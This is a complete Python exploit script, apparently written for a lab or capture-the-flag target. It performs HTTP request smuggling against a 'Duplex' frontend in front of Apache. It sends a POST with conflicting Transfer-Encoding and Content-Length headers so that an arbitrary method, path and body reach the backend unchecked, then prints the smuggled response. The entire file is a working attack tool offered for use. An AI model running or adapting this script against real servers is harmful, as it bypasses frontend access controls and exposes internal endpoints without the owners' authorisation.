#!/usr/bin/env python3
"""Smuggle an arbitrary request past the Duplex frontend and show Apache's answer.

    python3 probe.py <host:port> <METHOD> <path> [body]
"""
import socket
import sys

HOSTPORT = sys.argv[1]
METHOD = sys.argv[2]
PATH = sys.argv[3]
BODY = sys.argv[4] if len(sys.argv) > 4 else ""

SMUGGLED = (
    f"{METHOD} {PATH} HTTP/1.1\r\n"
    "Host: localhost\r\n"
    f"Content-Length: {len(BODY)}\r\n"
    "Connection: close\r\n"
    "\r\n"
    + BODY
)

body = "0\r\n\r\n" + SMUGGLED
head = (
    "POST / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Transfer-Encoding: chunked\r\n"
    f"Content-Length: {len(body)}\r\n"
    "\r\n"
)


def main():
    host, _, port = HOSTPORT.partition(":")
    s = socket.create_connection((host, int(port or 80)), timeout=15)
    s.settimeout(8)
    s.sendall((head + body).encode())
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    text = out.decode("latin1", "replace")
    # print only the second response (the smuggled one)
    parts = text.split("HTTP/1.1 ")
    print(f"### {METHOD} {PATH}")
    print("--- responses:", len(parts) - 1)
    for p in parts[1:]:
        status = p.split("\r\n", 1)[0]
        body_ = p.split("\r\n\r\n", 1)[-1]
        print(f"    {status}: {body_.strip()[:3000]!r}")


if __name__ == "__main__":
    main()
